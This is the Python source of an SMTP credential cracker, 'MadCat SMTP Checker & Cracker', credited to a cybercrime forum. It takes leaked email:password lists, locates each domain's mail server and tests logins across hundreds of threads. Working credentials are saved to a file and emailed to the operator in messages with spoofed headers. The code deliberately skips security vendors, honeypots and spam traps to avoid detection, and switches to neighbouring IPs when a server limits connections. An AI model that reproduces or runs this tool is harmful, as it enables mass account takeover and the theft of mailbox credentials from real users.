#!/usr/local/bin/python3

import socket, threading, sys, ssl, smtplib, time, re, os, random, signal, queue, requests, resource
try:
	import psutil
	from dns import resolver
except ImportError:
	print('\033[1;33minstalling missing packages...\033[0m')
	os.system(sys.executable+' -m pip install psutil dnspython')
	import psutil
	from dns import resolver

# mail providers, where SMTP access is desabled by default
bad_mail_servers = 'gmail,googlemail,google,mail.ru,yahoo,qq.com'
# needed for faster and stable dns resolutions
custom_dns_nameservers = ['8.8.8.8', '8.8.4.4', '9.9.9.9', '149.112.112.112', '1.1.1.1', '1.0.0.1', '76.76.19.19', '2001:4860:4860::8888', '2001:4860:4860::8844']
# for the sake of history
autoconfig_url = 'https://autoconfig.thunderbird.net/v1.1/'
# expanded lists of SMTP endpoints, where we can knock
autoconfig_data_url = 'https://raw.githubusercontent.com/aels/mailtools/main/smtp-checker/autoconfigs_enriched.txt'
# dangerous domains, skipping them all
dangerous_domains = r'localhost|invalid|mx37\.m..p\.com|mailinator|mxcomet|mxstorm|proofpoint|perimeterwatch|securence|techtarget|cisco|spiceworks|gartner|fortinet|retarus|checkpoint|fireeye|mimecast|forcepoint|trendmicro|acronis|sophos|sonicwall|cloudflare|trellix|barracuda|security|clearswift|trustwave|broadcom|helpsystems|zyxel|mdaemon|mailchannels|cyren|opswat|duocircle|uni-muenster|proxmox|censornet|guard|indevis|n-able|plesk|spamtitan|avanan|ironscales|mimecast|trustifi|shield|barracuda|essentials|libraesva|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|free|brukalai|metunet|excello'

b   = '\033[1m'
z   = '\033[0m'
wl  = '\033[2K'
up  = '\033[F'
err = b+'[\033[31mx\033[37m] '+z
okk = b+'[\033[32m+\033[37m] '+z
wrn = b+'[\033[33m!\033[37m] '+z
inf = b+'[\033[34m?\033[37m] '+z
npt = b+'[\033[37m>\033[37m] '+z

if sys.version_info[0] < 3:
	raise Exception('\033[0;31mPython 3 is required. Try to run this script with \033[1mpython3\033[0;31m instead of \033[1mpython\033[0m')

def show_banner():
	banner = f"""

              ,▄   .╓███?                ,, .╓███)                              
            ╓███| ╓█████╟               ╓█/,███╙                  ▄▌            
           ▄█^[██╓█* ██F   ,,,        ,╓██ ███`     ,▌          ╓█▀             
          ╓█` |███7 ▐██!  █▀╙██b   ▄██╟██ ▐██      ▄█   ▄███) ,╟█▀▀`            
          █╟  `██/  ██]  ██ ,██   ██▀╓██  ╙██.   ,██` ,██.╓█▌ ╟█▌               
         |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
         ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
         ╙█                           ╙                                         
          ╙     {b}MadCat SMTP Checker & Cracker v22.10.02{z}
                Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                https://github.com/aels/mailtools
                https://t.me/freebug
	"""
	for line in banner.splitlines():
		print(line)
		time.sleep(0.05)

def red(s,type):
	return f'\033[{str(type)};31m'+str(s)+z

def green(s,type):
	return f'\033[{str(type)};32m'+str(s)+z

def orange(s,type):
	return f'\033[{str(type)};33m'+str(s)+z

def blue(s,type):
	return f'\033[{str(type)};34m'+str(s)+z

def violet(s,type):
	return f'\033[{str(type)};35m'+str(s)+z

def cyan(s,type):
	return f'\033[{str(type)};36m'+str(s)+z

def white(s,type):
	return f'\033[{str(type)};37m'+str(s)+z

def bold(s):
	return b+str(s)+z

def num(s):
	return f'{int(s):,}'

def tune_network():
	try:
		resource.setrlimit(resource.RLIMIT_NOFILE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
		# if os.geteuid() == 0:
		# 	print('tuning network settings...')
		# 	os.system("echo 'net.core.rmem_default=65536\nnet.core.wmem_default=65536\nnet.core.rmem_max=8388608\nnet.core.wmem_max=8388608\nnet.ipv4.tcp_max_orphans=4096\nnet.ipv4.tcp_slow_start_after_idle=0\nnet.ipv4.tcp_synack_retries=3\nnet.ipv4.tcp_syn_retries =3\nnet.ipv4.tcp_window_scaling=1\nnet.ipv4.tcp_timestamp=1\nnet.ipv4.tcp_sack=0\nnet.ipv4.tcp_reordering=3\nnet.ipv4.tcp_fastopen=1\ntcp_max_syn_backlog=1500\ntcp_keepalive_probes=5\ntcp_keepalive_time=500\nnet.ipv4.tcp_tw_reuse=1\nnet.ipv4.tcp_tw_recycle=1\nnet.ipv4.ip_local_port_range=32768 65535\ntcp_fin_timeout=60' >> /etc/sysctl.conf")
		# else:
		# 	print('Better to run this script as root to allow better network performance')
	except:
		pass

def load_smtp_configs():
	global autoconfig_data_url, domain_configs_cache
	try:
		configs = requests.get(autoconfig_data_url, timeout=5).text.splitlines()
		for line in configs:
			line = line.strip().split(';')
			if len(line) != 3:
				continue
			domain_configs_cache[line[0]] = (line[1].split(','), line[2])
	except Exception as e:
		print(err+'failed to load SMTP configs. '+str(e))
		print(err+'performance will be affected.')

def first(a):
	return (a or ['']).pop(0)

def bytes_to_mbit(b):
	return round(b/1024./1024.*8, 2)

def normalize_delimiters(s):
	return re.sub(r'[;,\t| \'"]+', ':', s)

def is_listening(ip, port):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setblocking(0)
		s.settimeout(3)
		s = ssl.wrap_socket(s) if int(port) == 465 else s
		s.connect((ip, int(port)))
		s.close()
		return True
	except:
		return False

def get_rand_ip_of_host(host):
	global resolver_obj
	try:
		ip_array = resolver_obj.resolve(host, 'aaaa')
	except:
		try:
			ip_array = resolver_obj.resolve(host, 'a')
		except:
			raise Exception('No A record found for '+host)
	return str(random.choice(ip_array))

def get_alive_neighbor(ip, port):
	if ':' in str(ip):
		return ip
	else:
		tail = int(ip.split('.')[-1])
		prev_neighbor_ip = re.sub(r'\.\d+$', '.'+str(tail - 1 if tail>0 else 2), ip)
		next_neighbor_ip = re.sub(r'\.\d+$', '.'+str(tail + 1 if tail<255 else 253), ip)
		if is_listening(prev_neighbor_ip, port):
			return prev_neighbor_ip
		if is_listening(next_neighbor_ip, port):
			return next_neighbor_ip
		raise Exception('No listening neighbors found for '+ip+':'+str(port))

def guess_smtp_server(domain):
	global default_login_template, resolver_obj, domain_configs_cache, dangerous_domains
	domains_arr = [domain, 'smtp-qa.'+domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]
	try:
		mx_domain = str(resolver_obj.resolve(domain, 'mx')[0].exchange)[0:-1]
		domains_arr += [mx_domain]
	except:
		raise Exception('no MX records found for: '+domain)
	if re.search(dangerous_domains, mx_domain):
		raise Exception('\033[31mskipping dangerous domain: '+mx_domain+' (for '+domain+')\033[0m')
	if re.search(r'protection\.outlook\.com$', mx_domain):
		return domain_configs_cache['outlook.com']
	for host in domains_arr:
		try:
			ip = get_rand_ip_of_host(host)
		except:
			continue
		for port in [587, 465, 25]:
			if is_listening(ip, port):
					return ([host+':'+str(port)], default_login_template)
	raise Exception('no connection details found for '+domain)

def get_smtp_config(domain):
	global domain_configs_cache, default_login_template
	domain = domain.lower()
	if not domain in domain_configs_cache:
		domain_configs_cache[domain] = ['', default_login_template]
		domain_configs_cache[domain] = guess_smtp_server(domain)
	return domain_configs_cache[domain]

def get_free_smtp_server(smtp_server, port):
	smtp_class = smtplib.SMTP_SSL if str(port) == '465' else smtplib.SMTP
	smtp_server_ip = get_rand_ip_of_host(smtp_server)
	try:
		return smtp_class(smtp_server_ip, port, local_hostname=smtp_server, timeout=5)
	except Exception as e:
		if re.search(r'too many connections|threshold limitation|parallel connections|try later|refuse', str(e).lower()):
			smtp_server_ip = get_alive_neighbor(smtp_server_ip, port)
			return smtp_class(smtp_server_ip, port, local_hostname=smtp_server, timeout=5)
		else:
			raise Exception(e)

def quit(signum, frame):
	print('\r\n'+okk+'Exiting... See ya later. Bye.')
	sys.exit(0)

def is_valid_email(email):
	return re.match(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}$', email.lower())

def find_email_password_collumnes(list_filename):
	email_collumn = False
	with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
		for line in fp:
			line = normalize_delimiters(line.lower())
			email = re.search(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}', line)
			if email:
				email_collumn = line.split(email[0])[0].count(':')
				password_collumn = email_collumn+1
				if re.search(r'@.+123', line):
					password_collumn = line.split('123')[0].count(':')
					break
	if email_collumn is not False:
		return (email_collumn, password_collumn)
	raise Exception('the file you provided does not contain emails')

def wc_count(filename):
	return int(os.popen('wc -l '+filename).read().strip().split(' ')[0])

def is_ignored_host(mail):
	global exclude_mail_hosts
	return len([ignored_str for ignored_str in exclude_mail_hosts.split(',') if ignored_str in mail.split('@')[1]])>0

def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
	global verify_email, debuglevel
	if is_valid_email(smtp_user):
		smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
	else:
		smtp_login = smtp_user
	server_obj = get_free_smtp_server(smtp_server, port)
	server_obj.set_debuglevel(debuglevel)
	server_obj.ehlo()
	if server_obj.has_extn('starttls') and port != '465':
		server_obj.starttls()
		server_obj.ehlo()
	server_obj.login(smtp_login, password)
	if verify_email:
		headers_arr = [
			'From: MadCat checker <%s>'%smtp_user,
			'Resent-From: admin@localhost',
			'To: '+verify_email,
			'Subject: new SMTP from MadCat checker',
			'Return-Path: '+smtp_user,
			'Reply-To: '+smtp_user,
			'X-Priority: 1',
			'X-MSmail-Priority: High',
			'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
			'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
			'MIME-Version: 1.0',
			'Content-Type: text/html; charset="utf-8"',
			'Content-Transfer-Encoding: 8bit'
		]
		body = f'{smtp_server}|{port}|{smtp_login}|{password}'
		message_as_str = '\n'.join(headers_arr+['', body, ''])
		server_obj.sendmail(smtp_user, verify_email, message_as_str)
	server_obj.quit()

def worker_item(jobs_que, results_que):
	global min_threads, threads_counter, verify_email, goods, no_jobs_left, loop_times, default_login_template
	while True:
		if (mem_usage>90 or cpu_usage>90) and threads_counter>min_threads:
			break
		if jobs_que.empty():
			if no_jobs_left:
				break
			else:
				results_que.put('queue exhausted, '+bold('sleeping...'))
				time.sleep(1)
				continue
		else:
			time_start = time.perf_counter()
			smtp_server, port, smtp_user, password = jobs_que.get()
			login_template = default_login_template
			try:
				results_que.put(f'getting settings for {smtp_user}:{password}')
				if not smtp_server or not port:
					smtp_server_port_arr, login_template = get_smtp_config(smtp_user.split('@')[1])
					if len(smtp_server_port_arr):
						smtp_server, port = random.choice(smtp_server_port_arr).split(':')
					else:
						raise Exception('still no connection details for '+smtp_user)
				results_que.put(blue('connecting to',0)+f' {smtp_server}|{port}|{smtp_user}|{password}')
				smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password)
				results_que.put(green(smtp_user+':'+password,7)+(verify_email and green(' sent\a to '+verify_email,7)))
				open(smtp_filename, 'a').write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
				goods += 1
				time.sleep(1)
			except Exception as e:
				results_que.put(orange((smtp_server and port and smtp_server+':'+port+' - ' or '')+str(e).strip()[0:130],0))
			loop_times.append(time.perf_counter() - time_start)
			loop_times.pop(0) if len(loop_times)>min_threads else 0
	threads_counter -= 1

def every_second():
	global progress, speed, mem_usage, cpu_usage, net_usage, jobs_que, results_que, threads_counter, min_threads, loop_times, loop_time, no_jobs_left
	progress_old = progress
	net_usage_old = 0
	time.sleep(1)
	while True:
		try:
			speed.append(progress - progress_old)
			speed.pop(0) if len(speed)>10 else 0
			progress_old = progress
			mem_usage = round(psutil.virtual_memory()[2])
			cpu_usage = round(sum(psutil.cpu_percent(percpu=True))/os.cpu_count())
			net_usage = psutil.net_io_counters().bytes_sent - net_usage_old
			net_usage_old += net_usage
			loop_time = round(sum(loop_times)/len(loop_times), 2) if len(loop_times) else 0
			if threads_counter<max_threads and mem_usage<80 and cpu_usage<80 and not no_jobs_left:
				threading.Thread(target=worker_item, args=(jobs_que, results_que), daemon=True).start()
				threads_counter += 1
			time.sleep(0.1)
		except:
			pass

def printer(jobs_que, results_que):
	global progress, total_lines, speed, loop_time, cpu_usage, mem_usage, net_usage, threads_counter, goods, ignored
	while True:
		status_bar = (
			f'{b}['+green('\u2665',int(time.time()*2)%2)+f'{b}]{z}'+
			f'[ progress: {bold(num(progress))}/{bold(num(total_lines))} ({bold(round(progress/total_lines*100))}%) ]'+
			f'[ speed: {bold(num(sum(speed)))}lines/s ({bold(loop_time)}s/loop) ]'+
			f'[ cpu: {bold(cpu_usage)}% ]'+
			f'[ mem: {bold(mem_usage)}% ]'+
			f'[ net: {bold(bytes_to_mbit(net_usage*10))}Mbit/s ]'+
			f'[ threads: {bold(threads_counter)} ]'+
			f'[ goods/ignored: {green(num(goods),1)}/{bold(num(ignored))} ]'
		)
		thread_statuses = []
		while not results_que.empty():
			thread_statuses.append(results_que.get())
			progress += 1 if 'getting' in thread_statuses[-1] else 0
		if len(thread_statuses):
			print(wl+'\n'.join(thread_statuses))
		print(wl+status_bar+up)
		time.sleep(0.04)

signal.signal(signal.SIGINT, quit)
show_banner()
tune_network()
try:
	help_message = f'usage: \n{npt}python3 {sys.argv[0]} '+bold('list.txt')+' [verify_email@example.com] [ignored,email,domains] [start_from_line] [debug]'
	list_filename = ([i for i in sys.argv if os.path.isfile(i) and sys.argv[0] != i]+[False]).pop(0)
	verify_email = ([i for i in sys.argv if is_valid_email(i)]+[False]).pop(0)
	exclude_mail_hosts = ','.join([i for i in sys.argv if re.match(r'[\w.,-]+$', i) and not os.path.isfile(i) and not re.match(r'(\d+|debug)$', i)]+[bad_mail_servers])
	start_from_line = int(([i for i in sys.argv if re.match(r'\d+$', i)]+[0]).pop(0))
	debuglevel = len([i for i in sys.argv if i == 'debug'])
	rage_mode = len([i for i in sys.argv if i == 'rage'])
	if not list_filename:
		print(inf+help_message)
		while not os.path.isfile(list_filename):
			list_filename = input(npt+'path to file with emails & passwords: ')
		while not is_valid_email(verify_email) and verify_email != '':
			verify_email = input(npt+'email to send results to (leave empty if none): ')
		exclude_mail_hosts = input(npt+'ignored email domains, comma separated (leave empty if none): ')
		exclude_mail_hosts = bad_mail_servers+','+exclude_mail_hosts if exclude_mail_hosts else bad_mail_servers
		start_from_line = input(npt+'start from line (leave empty to start from 0): ')
		while not re.match(r'\d+$', start_from_line) and start_from_line != '':
			start_from_line = input(npt+'start from line (leave empty to start from 0): ')
		start_from_line = int('0'+start_from_line)
	smtp_filename = re.sub(r'\.[^.]+$', '_smtp.'+list_filename.split('.')[-1], list_filename)
	verify_email = verify_email or ''
except:
	print(err+help_message)
try:
	email_collumn, password_collumn = find_email_password_collumnes(list_filename)
except Exception as e:
	exit(err+red(e))

jobs_que = queue.Queue()
results_que = queue.Queue()
ignored = 0
goods = 0
mem_usage = 0
cpu_usage = 0
net_usage = 0
min_threads = 50
max_threads = debuglevel or rage_mode and 600 or 300
threads_counter = 0
no_jobs_left = False
loop_times = []
loop_time = 0
speed = []
progress = start_from_line
default_login_template = '%EMAILADDRESS%'
total_lines = wc_count(list_filename)
resolver_obj = resolver.Resolver()
resolver_obj.nameservers = custom_dns_nameservers
domain_configs_cache = {}
load_smtp_configs()

print(okk+'loading SMTP configs:          '+bold(num(len(domain_configs_cache))+' lines'))
print(inf+'source file:                   '+bold(list_filename))
print(inf+'total lines to procceed:       '+bold(num(total_lines)))
print(inf+'email & password colls:        '+bold(email_collumn)+' and '+bold(password_collumn))
print(inf+'ignored email hosts:           '+bold(exclude_mail_hosts))
print(inf+'goods file:                    '+bold(smtp_filename))
print(inf+'verification email:            '+bold(verify_email or '-'))
input(npt+'press '+bold('[ Enter ]')+' to start...')

threading.Thread(target=every_second, daemon=True).start()
threading.Thread(target=printer, args=(jobs_que, results_que), daemon=True).start()

with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
	for i in range(start_from_line):
		line = fp.readline()
	while True:
		while not no_jobs_left and jobs_que.qsize()<min_threads*2:
			line = fp.readline()
			if not line:
				no_jobs_left = True
				break
			if line.count('|') == 3:
				jobs_que.put((line.strip().split('|')))
			else:
				line = normalize_delimiters(line.strip())
				fields = line.split(':')
				if len(fields)>1 and is_valid_email(fields[email_collumn]) and not is_ignored_host(fields[email_collumn]) and len(fields[password_collumn])>5:
					jobs_que.put((False, False, fields[email_collumn], fields[password_collumn]))
				else:
					ignored += 1
					progress += 1
		if threads_counter == 0 and no_jobs_left:
			break
	print('\r\n'+okk+green('Well done. Bye.',1))
